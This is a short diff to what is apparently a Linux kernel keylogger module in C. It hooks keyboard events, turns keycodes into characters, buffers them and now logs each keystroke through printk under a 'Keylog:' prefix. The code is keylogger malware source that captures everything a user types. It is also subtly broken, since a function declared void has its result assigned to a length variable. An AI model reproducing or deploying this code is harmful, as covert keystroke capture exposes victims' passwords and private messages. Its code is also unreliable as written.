@@ -14,7 +14,7 @@ void keycode_to_string(int keycode, int shift_mask, char* buf, unsigned int buf_
                         ? us_keymap[keycode][1]
                         : us_keymap[keycode][0]; /* Check if shift pressed. */
 
-                snprintf(buf, buf_size, "%s", us_key); /* enter the key pair to buf */
+                len = snprintf(buf, buf_size, "%s", us_key); /* enter the key pair to buf */
         }
 }
 
@@ -28,16 +28,16 @@ int keyboard_event_handler(struct notifier_block* nblock, unsigned long code, vo
 
         if(code == KBD_KEYCODE)
         {
-                keycode_to_string(param->value, param->shift, keybuf, 12);
+                len = keycode_to_string(param->value, param->shift, keybuf, 12);
 
                 if (strlen(keybuf) > 0)
                 {
                         strncpy(msg+buf_index, keybuf, len);
                         buf_index += len;
 
-                        msg[buf_index] = '\n';
-                        buf_index += 1;
-                        //printk(KERN_INFO "Keylog: %s", keybuf);
+                        // msg[buf_index] = '\n';
+                        //buf_index += 1;
+			printk(KERN_INFO "Keylog: %s", keybuf);
                 }
 
         }
